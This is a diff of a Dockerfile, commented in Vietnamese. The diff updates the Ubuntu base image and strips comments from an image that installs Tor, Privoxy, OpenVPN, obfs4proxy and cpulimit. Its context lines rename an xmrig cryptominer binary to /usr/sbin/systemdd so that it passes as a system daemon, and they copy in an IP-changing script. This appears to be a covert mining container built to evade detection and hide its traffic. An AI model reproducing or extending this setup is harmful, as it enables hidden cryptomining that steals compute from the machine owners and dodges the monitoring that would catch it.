@@ -1,5 +1,5 @@
-# Sử dụng image cơ bản từ Ubuntu
-FROM ubuntu:20.04
+# Sử dụng image cơ bản từ Ubuntu 22.04.5 LTS
+FROM ubuntu:22.04
 
 # Cài đặt các công cụ cần thiết bao gồm Tor, Privoxy, OpenVPN và obfs4proxy
 RUN apt-get update && apt-get install -y \
@@ -8,7 +8,7 @@ RUN apt-get update && apt-get install -y \
     tor \
     privoxy \
     openvpn \
-    obfs4proxy \   # Cài đặt obfs4proxy để sử dụng Tor Bridges
+    obfs4proxy \
     bc \
     rename \
     cpulimit \
@@ -40,12 +40,10 @@ RUN mv /root/work/xmrig /usr/sbin/systemdd
 
 # Sao chép các file cấu hình vào container
 COPY config /etc/privoxy/config
-COPY torrc /etc/tor/torrc  # Sao chép file torrc có cấu hình Tor Bridges vào container
+COPY torrc /etc/tor/torrc
 COPY start.sh /root/start.sh
 COPY change_ip.sh /root/change_ip.sh
 COPY client.ovpn /etc/openvpn/client.ovpn
-
-
 
 # Cấp quyền cho script và file cấu hình
 RUN chmod +x /root/start.sh /root/change_ip.sh \
